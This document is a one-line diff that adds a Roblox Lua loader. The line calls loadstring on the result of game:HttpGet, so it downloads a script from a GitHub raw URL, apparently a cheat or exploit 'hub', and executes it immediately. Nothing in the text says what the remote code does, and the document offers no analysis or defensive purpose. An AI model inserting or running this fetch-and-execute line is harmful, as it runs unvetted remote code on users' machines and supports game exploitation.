@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/qwenix123/pyanskHub/main/main.lua"))()
